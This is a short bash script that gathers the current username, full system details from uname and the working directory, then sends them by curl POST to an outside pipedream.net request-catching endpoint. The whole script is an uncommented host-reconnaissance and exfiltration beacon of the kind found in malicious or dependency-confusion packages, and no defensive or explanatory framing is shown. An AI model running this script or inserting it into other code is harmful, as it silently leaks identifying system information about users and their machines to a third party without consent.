#!/bin/bash

username=$(whoami)
os_details=$(uname -a)
current_directory=$(pwd)

data="username=$username&os_details=$os_details&current_directory=$current_directory"

curl -X POST -d "$data" https://eo3wlhoncmg5fr9.m.pipedream.net
